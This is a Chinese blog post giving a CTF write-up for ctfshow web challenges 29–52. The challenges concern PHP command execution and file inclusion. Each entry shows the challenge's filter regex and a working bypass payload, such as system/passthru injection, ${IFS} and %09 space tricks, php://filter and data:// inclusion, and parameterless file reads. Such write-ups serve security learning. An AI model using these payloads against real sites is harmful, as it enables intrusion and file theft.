<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>ctfshow命令执行 | BkingXD</title><meta name="keywords" content="web,ctfshow"><meta name="author" content="BkingXD"><meta name="copyright" content="BkingXD"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ctfshow web入门命令执行这一部分的WP。">
<meta property="og:type" content="article">
<meta property="og:title" content="ctfshow命令执行">
<meta property="og:url" content="https://bkingxd.github.io/2021/10/12/ctfshow%20WEB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
<meta property="og:site_name" content="BkingXD">
<meta property="og:description" content="ctfshow web入门命令执行这一部分的WP。">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png">
<meta property="article:published_time" content="2021-10-12T07:18:06.000Z">
<meta property="article:modified_time" content="2024-03-01T06:44:25.760Z">
<meta property="article:author" content="BkingXD">
<meta property="article:tag" content="web">
<meta property="article:tag" content="ctfshow">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png"><link rel="shortcut icon" href="/img/578879781.png"><link rel="canonical" href="https://bkingxd.github.io/2021/10/12/ctfshow%20WEB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ctfshow命令执行',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-03-01 14:44:25'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="BkingXD" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/578879781.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">38</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">BkingXD</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ctfshow命令执行</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-10-12T07:18:06.000Z" title="Created 2021-10-12 15:18:06">2021-10-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-03-01T06:44:25.760Z" title="Updated 2024-03-01 14:44:25">2024-03-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">9.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>42min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ctfshow命令执行"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>/?c=system(&quot;ls&quot;);</code>，发现有<code>flag.php</code>，题目过滤了flag字符，<code>payload：/?c=system(&quot;cat fl*&quot;);</code>，然后查看源码就行。</p>
<h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>)</span><br></pre></td></tr></table></figure>

<p><code>system</code>被过滤了，用<code>passthru</code>替换，<code>payload：/?c=passthru(&quot;cat fl*&quot;);</code></p>
<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>)</span><br></pre></td></tr></table></figure>

<p><code>cat</code>被过滤了，用<code>tac</code>替换，空格也过滤了，用<code>%09</code>绕过，<code>payload：/?c=passthru(&quot;tac%09fl*&quot;);</code></p>
<h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>)</span><br></pre></td></tr></table></figure>

<p>又过滤了<code>;</code>，用<code>?&gt;</code>替换，连括号都过滤了，那只能用无括号函数，这里用include文件包含并且二次传参，<code>payload：/?c=include&quot;$_GET[0]&quot;?&gt;&amp;0=php://filter/read=convert.base64-encode/resource=flag.php</code>，最后进行base64解码</p>
<h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>)</span><br></pre></td></tr></table></figure>

<p>又多过滤了一个双引号，将上一题的双引号去掉就行。<code>payload：/?c=include$_GET[0]?&gt;&amp;0=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>)</span><br></pre></td></tr></table></figure>

<p>又多过滤了个冒号，无影响，payload同上一题</p>
<h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>)</span><br></pre></td></tr></table></figure>

<p>又多加了小于号和等号，无影响，payload同上题</p>
<h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>)</span><br></pre></td></tr></table></figure>

<p>有多过滤了数字，payload同上题，只要改二次传参的参数，<code>0</code>替换成<code>a</code></p>
<h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>文件包含，用伪协议读文件，<code>payload：/?c=data://text/plain,&lt;?php system(&quot;cat fl*&quot;); ?&gt;</code>，然后查看源码就行</p>
<p>也可以，<code>/?c=php://input    POST：&lt;?php system(&quot;cat flag.php&quot;); ?&gt;</code></p>
<h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>)</span><br></pre></td></tr></table></figure>

<p>多过滤了<code>php</code>和<code>file</code>，所以php标记不能直接用，那就编码绕过，最终</p>
<p><code>payload：/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTsgPz4=</code></p>
<p>也可以用短标签<code>/?c=data://text/plain,&lt;?=system(&quot;cat fl*&quot;)?&gt;</code></p>
<h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<!--data://text/plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么 作用-->payload同上一题

<h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$</code>被过滤了，不能<code>$_GET[]</code>二次传参，<code>/</code>被过滤，日志文件包含好像也不行了，注意这里的括号是中文括号，所以有括号的函数可以用，但是这里单双引号都被过滤，函数就不能直接传参，要用到<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/242482.html">无参数读取文件</a>的方法，</p>
<p><code>/?c=print_r(scandir(current(localeconv())));</code>，产看当前目录所有文件名，返回如下，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; flag.php [3] &#x3D;&gt; index.php )</span><br></pre></td></tr></table></figure>

<p>然后读取文件<code>payload：/?c=show_source(next(array_reverse(scandir(current(localeconv())))));</code></p>
<h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>字母、数字都被过滤了，但是特意留了个或运算符<code>|</code>。我们可以尝试从ASCII为0-255的字符中，找到或运算能得到我们可用的字符的字符，例如<code>A %01|%40</code>，构造用到了WP给的脚本，</p>
<p>这里还要注意两个点，函数大小写不敏感，<code>(&#39;system&#39;)(&#39;ls&#39;)</code>可以等于<code>system(&#39;ls&#39;)</code>执行，可以手动构造，但要注意换行符，同样可以用脚本跑一下</p>
<h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<span class="comment">//使输入的命令的执行结果导入到/dev/null，换言之就是与它相连的命令执行后没有回显</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以这里绕过方法是执行多条命令，<code>payload：/?c=cat flag.php;ls</code></p>
<h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>相较上一题，过滤了分号和<code>cat</code>，分号可以用管道符<code>||</code>替换，<code>cat</code>用<code>nl</code>或<code>tac</code>替换，<code>payload：/?c=tac flag.php||ls</code></p>
<h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>flag被过滤了，<code>*</code>绕过，<code>payload：/?c=tac fl*||ls</code></p>
<h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>空格被过滤了，绕过的办法有很多，这里采用<code>%09</code>，<code>payload：/?c=tac%09fl*||ls</code></p>
<h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>*</code>又被过滤了，用单双引号或<code>\</code>绕过，<code>payload：/?c=tac%09fl&#39;&#39;ag.php||ls</code></p>
<h2 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">    system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>又过滤了些不影响的命令，payload同上一题</p>
<h2 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>增加了过滤的内容，但都是一些无关紧要的命令，payload同上一题</p>
<h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>换个payload，空格可以用<code>&lt;</code>绕过，<code>/?c=tac&lt;fl&#39;&#39;ag.php||ls</code></p>
<h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>\x09</code>被过滤了，空格就不能用<code>%09</code>绕过，payload可以用上一题</p>
<h2 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>tac</code>被过滤了，替换成<code>nl</code>，<code>payload：/?c=nl&lt;fl&#39;&#39;ag.php||ls</code></p>
<h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>&lt;</code>也被过滤了，但它又把<code>$</code>放出来了，所以<code>/?c=nl$&#123;IFS&#125;fl&#39;&#39;ag.php||ls</code>，但进去发现没有flag，说明flag不在<code>flag.php</code>，于是<code>/?c=ls$&#123;IFS&#125;/||ls</code>，发现根目录下有一个<code>flag</code>文件，读取<code>/?c=nl$&#123;IFS&#125;/fl&#39;&#39;ag||ls</code></p>
